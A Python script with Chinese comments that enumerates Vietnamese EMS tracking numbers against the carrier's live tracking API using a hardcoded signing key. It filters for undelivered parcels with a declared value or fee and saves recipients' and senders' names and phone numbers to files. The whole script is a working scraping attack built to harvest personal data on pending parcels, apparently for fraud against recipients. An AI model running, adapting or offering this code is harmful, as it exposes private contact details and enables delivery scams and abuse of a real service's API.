#!/usr/bin/env python3
"""
智能爬取真实有效的运单号
筛选条件：未签收 + 有运费/价格
"""
import hashlib
import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor

KEY = '34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A'
API_URL = 'https://api-dingdong.ems.com.vn/api/TrackTrace/Lading'

def verify_tracking(code):
    """验证并获取运单详情"""
    signature = hashlib.sha256((code.upper() + KEY).encode()).hexdigest().upper()
    payload = {'LadingCode': code, 'Signature': signature}
    
    try:
        r = requests.post(API_URL, json=payload, timeout=5)
        result = r.json()
        
        if result.get('Code') == '00':
            data = result.get('Value', {})
            return {
                'code': code,
                'signed': bool(data.get('SignatureCapture')),
                'value': data.get('Value', 0),
                'fee': data.get('Fee', 0),
                'sender': data.get('SenderName', ''),
                'receiver': data.get('ReceiverName', ''),
                'receiver_phone': data.get('ReceiverMobile', ''),
                'sender_phone': data.get('SenderMobile', ''),
            }
    except:
        pass
    
    return None

print("=" * 80)
print("🎯 智能爬取：未签收+有价格的运单号")
print("=" * 80)

# 1. 配置爬取范围
print("\n📋 已知有效的运单号前缀范围:")
print("  EA775900xxx - 已验证有效")
print("  EA775901xxx - 待测试")
print("  EA775902xxx - 待测试")
print("  ... 等等")
print()

print("请选择爬取策略:")
print("  1. 快速测试 (EA77590xxxx，1000个)")
print("  2. 中等规模 (EA7759xxxxx，10000个)")
print("  3. 大规模 (EA775xxxxxxx，100000个)")
print("  4. 自定义范围")

choice = input("\n请选择 (1/2/3/4): ").strip() or '1'

if choice == '1':
    prefix = 'EA77590'
    start, end = 0, 999
elif choice == '2':
    prefix = 'EA7759'
    start, end = 0, 9999
elif choice == '3':
    prefix = 'EA775'
    start, end = 0, 99999
elif choice == '4':
    prefix = input("前缀 (如EA775): ")
    start = int(input("起始号码: "))
    end = int(input("结束号码: "))
else:
    prefix = 'EA77590'
    start, end = 0, 999

total = end - start + 1
print(f"\n✅ 爬取范围: {prefix}{start:04d}VN ~ {prefix}{end:04d}VN")
print(f"   总数: {total} 个")
print(f"   预计: {total*0.3/60:.0f} 分钟")

confirm = input(f"\n开始爬取？(y/n): ").strip().lower()
if confirm != 'y':
    print("❌ 已取消")
    exit(0)

# 2. 开始爬取
print(f"\n🚀 开始爬取...\n")

valid_codes = []
cod_codes = []
start_time = time.time()

def fetch_and_filter(i):
    code = f'{prefix}{i:04d}VN' if len(str(i)) <= 4 else f'{prefix}{i}VN'
    data = verify_tracking(code)
    
    if data:
        # 未签收
        if not data['signed']:
            # 有价格
            if data['value'] > 0 or data['fee'] > 0:
                return data
    
    return None

# 多线程爬取
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(fetch_and_filter, i): i for i in range(start, end + 1)}
    
    completed = 0
    for future in futures:
        result = future.result()
        
        if result:
            valid_codes.append(result)
            cod_codes.append(result['code'])
            print(f"✅ {result['code']} | 未签收 | 价值:{result['value']}đ 运费:{result['fee']}đ | {result['receiver'][:20]}")
        
        completed += 1
        if completed % 100 == 0:
            elapsed = time.time() - start_time
            speed = completed / elapsed * 60
            remaining = (total - completed) / speed * 60
            print(f"  [{completed}/{total}] ({completed*100//total}%) | "
                  f"找到: {len(valid_codes)} | "
                  f"速度: {speed:.0f}/分 | 剩余: {remaining:.0f}分")

elapsed = time.time() - start_time

# 3. 保存结果
print()
print("=" * 80)
print("✅ 完成！")
print("=" * 80)
print(f"⏱️  用时: {elapsed/60:.0f} 分钟")
print(f"📊 爬取: {total} 个")
print(f"✅ 有效: {len(valid_codes)} 个")
print(f"🎯 符合条件: {len(cod_codes)} 个 (未签收+有价格)")
print("=" * 80)

if valid_codes:
    # 保存JSON
    with open('valid_cod_tracking.json', 'w', encoding='utf-8') as f:
        json.dump(valid_codes, f, indent=2, ensure_ascii=False)
    
    # 保存运单号列表
    with open('valid_cod_tracking.txt', 'w') as f:
        for code in cod_codes:
            f.write(code + '\n')
    
    print("\n💾 已保存:")
    print("  valid_cod_tracking.json - 完整信息")
    print("  valid_cod_tracking.txt - 运单号列表")
    
    print("\n📋 样本:")
    for i, data in enumerate(valid_codes[:5], 1):
        print(f"  {i}. {data['code']}")
        print(f"     收件人: {data['receiver']}")
        print(f"     电话: {data['receiver_phone']}")
        print(f"     价值: {data['value']}đ")
        print(f"     运费: {data['fee']}đ")
else:
    print("\n⚠️  没有找到符合条件的运单号")
    print("   尝试扩大搜索范围或更换前缀")
